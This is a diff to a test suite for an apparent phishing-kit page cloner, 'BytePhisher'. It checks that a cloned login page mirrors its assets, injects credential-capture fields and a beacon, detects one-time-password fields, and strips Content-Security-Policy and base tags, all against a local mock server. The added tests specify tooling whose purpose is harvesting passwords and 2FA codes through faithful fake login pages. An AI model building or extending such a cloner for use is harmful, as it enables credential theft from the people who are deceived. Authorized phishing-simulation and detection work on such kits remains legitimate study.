@@ -134,14 +134,24 @@ class TestMirroring:
             assert any(f.endswith(want) for f in files), (want, files)
 
     def test_a_css_pulls_its_own_fonts(self, brand):
+        """The font must resolve from inside assets/.
+
+        A stylesheet's url() is relative to the STYLESHEET, not to the page, so a
+        rewritten `url(assets/x.woff2)` inside assets/app.css resolves to
+        assets/assets/x.woff2 - a 404 and a page rendering in fallback fonts.
+        """
         home, port = brand
         res = _import(home, port)
         assets = os.path.join(res["dir"], "assets")
         css = [f for f in os.listdir(assets) if f.endswith(".css")]
         assert css, os.listdir(assets)
         text = open(os.path.join(assets, css[0]), encoding="utf-8").read()
-        assert "url('assets/" in text or "url(assets/" in text, text
         assert "/static/x.woff2" not in text, text
+        refs = re.findall(r"url\(\s*[\"\']?([^\"\')]+)", text)
+        assert refs, text
+        for ref in refs:
+            assert not ref.startswith("assets/"), (ref, text)
+            assert os.path.isfile(os.path.join(assets, ref)), (ref, os.listdir(assets))
 
     def test_beacons_are_removed_not_mirrored(self, brand):
         home, port = brand
@@ -191,3 +201,195 @@ class TestMirroring:
         assert m["bytes"] > 0
         assert len(m["mirrored"]) >= 4, m
         assert m["remaining_remote"] == [], m
+
+
+# ==================================================== the advanced clone pass ==
+ADV_PAGE = """<!doctype html><html><head>
+<base href="https://brand.example/">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="/static/app.css">
+<style>.hero{background:url('/static/hero.png')}</style>
+</head><body>
+<img src="logo.png" srcset="logo.png 1x, logo@2x.png 2x" alt="logo">
+<form action="/session" method="post">
+  <label for="user">Email or phone</label>
+  <input id="user" name="user" type="email" placeholder="Email" autocomplete="username">
+  <label for="pass">Password</label>
+  <input id="pass" name="pass" type="password" autocomplete="current-password">
+  <input name="totp_code" type="text" inputmode="numeric">
+  <button type="submit">Sign in</button>
+</form>
+<script src="/static/app.js"></script>
+</body></html>"""
+
+ADV_CSS = ("@import url('/static/theme.css');\n"
+           "@font-face{font-family:X;src:url('/static/x.woff2') format('woff2')}\n"
+           "body{color:#0A5BD3;background:url('/static/hero.png')}")
+
+
+class AdvSite(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+
+    def log_message(self, *a):
+        pass
+
+    def do_GET(self):
+        if self.path.startswith("/login"):
+            body, ctype = ADV_PAGE.encode(), "text/html; charset=utf-8"
+        elif self.path == "/static/app.css":
+            body, ctype = ADV_CSS.encode(), "text/css"
+        elif self.path == "/static/theme.css":
+            body, ctype = b".t{color:#fff}", "text/css"
+        elif self.path.endswith((".js",)):
+            body, ctype = b"console.log('a')", "application/javascript"
+        elif self.path.endswith((".png", ".woff2")):
+            body, ctype = b"\x89PNG\r\n\x1a\n" + b"0" * 20, "image/png"
+        else:
+            body, ctype = b"nope", "text/plain"
+            self.send_response(404)
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        self.send_response(200)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+
+class WallSite(AdvSite):
+    def do_GET(self):
+        body = (b"<html><head><title>Just a moment...</title></head>"
+                b"<body>Checking your browser before accessing</body></html>")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+
+@pytest.fixture()
+def adv(monkeypatch):
+    home = tempfile.mkdtemp(prefix="bh_adv_home_")
+    monkeypatch.setenv("BYTEPHISHER_HOME", home)
+    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), AdvSite)
+    srv.daemon_threads = True
+    port = srv.server_address[1]
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    time.sleep(0.2)
+    for mod in [m for m in list(sys.modules) if m.endswith("import_site")]:
+        del sys.modules[mod]
+    yield home, port
+    srv.shutdown()
+
+
+@pytest.fixture()
+def wall(monkeypatch):
+    home = tempfile.mkdtemp(prefix="bh_wall_home_")
+    monkeypatch.setenv("BYTEPHISHER_HOME", home)
+    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), WallSite)
+    srv.daemon_threads = True
+    port = srv.server_address[1]
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    time.sleep(0.2)
+    for mod in [m for m in list(sys.modules) if m.endswith("import_site")]:
+        del sys.modules[mod]
+    yield home, port
+    srv.shutdown()
+
+
+def _adv_import(home, port, **kw):
+    from tools import import_site as imp
+    imp.TEMPLATES = os.path.join(home, "templates")
+    os.makedirs(imp.TEMPLATES, exist_ok=True)
+    return imp.import_site(url=f"http://127.0.0.1:{port}/login", name="AdvBrand",
+                           slug="advbrand", **kw)
+
+
+class TestTheAdvancedClone:
+    def test_the_capture_fields_are_injected_and_the_page_fields_are_kept(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        html = _html(res)
+        assert 'name="hp_email"' in html and 'name="_tpl"' in html
+        assert 'name="_ts"' in html and "hp_email" in html
+        assert res["capture_injected"] is True
+        # the page's own names stay the field list; ours are added, not merged into it
+        assert res["capture_fields"] == ["user", "pass", "totp_code"]
+
+    def test_the_field_map_carries_types_placeholders_and_labels(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        by_name = {f["name"]: f for f in res["form_fields"]}
+        assert by_name["user"]["type"] == "email"
+        assert by_name["user"]["placeholder"] == "Email"
+        assert by_name["user"]["autocomplete"] == "username"
+        assert by_name["user"]["label"] == "Email or phone"
+        assert by_name["pass"]["type"] == "password"
+
+    def test_the_otp_field_on_the_page_is_detected(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        fields = json.load(open(os.path.join(res["dir"], "fields.json")))
+        assert "totp_code" in fields["page_otp_fields"]
+
+    def test_srcset_candidates_are_mirrored_and_local(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        html = _html(res)
+        assert res["mirror"]["srcset_rewritten"] >= 2, res["mirror"]
+        assert "https://brand.example" not in html
+        assert "/static/" not in html
+        for ref in re.findall(r"srcset=[\"']([^\"']+)", html):
+            for part in ref.split(","):
+                target = part.strip().split(" ")[0]
+                assert os.path.isfile(os.path.join(res["dir"], target)), target
+
+    def test_a_css_import_is_followed(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        assert res["mirror"]["css_imports"] >= 1, res["mirror"]
+        assets = os.path.join(res["dir"], "assets")
+        css = [f for f in os.listdir(assets) if f.endswith(".css")]
+        joined = "".join(open(os.path.join(assets, f), encoding="utf-8").read()
+                         for f in css)
+        assert "/static/theme.css" not in joined, joined
+        assert os.path.isfile(os.path.join(assets, "theme.css"))
+
+    def test_a_csp_meta_and_a_base_tag_are_removed(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        html = _html(res).lower()
+        assert "content-security-policy" not in html
+        assert "<base" not in html
+        assert res["mirror"]["csp_stripped"] == 1
+        assert res["mirror"]["base_dropped"] == 1
+
+    def test_the_clone_report_is_written_next_to_the_page(self, adv):
+        home, port = adv
+        res = _adv_import(home, port)
+        path = os.path.join(res["dir"], "clone_report.json")
+        assert os.path.isfile(path)
+        report = json.load(open(path))
+        assert report["slug"] == "advbrand"
+        assert report["capture_injected"] is True
+        assert report["mirror"]["bytes"] > 0
+        assert report["brand"].startswith("#")
+
+    def test_scripts_can_be_stripped_but_the_beacon_stays(self, adv):
+        home, port = adv
+        res = _adv_import(home, port, strip_scripts=True)
+        html = _html(res)
+        assert "console.log" not in html
+        assert "hp_email" in html and "addEventListener" in html
+        assert res["mirror"]["scripts_removed"] >= 1
+
+    def test_a_bot_wall_is_reported_rather_than_cloned_silently(self, wall):
+        home, port = wall
+        res = _adv_import(home, port)
+        assert res["warning"], res
+        assert "bot wall" in res["warning"]
+        report = json.load(open(os.path.join(res["dir"], "clone_report.json")))
+        assert report["warning"]
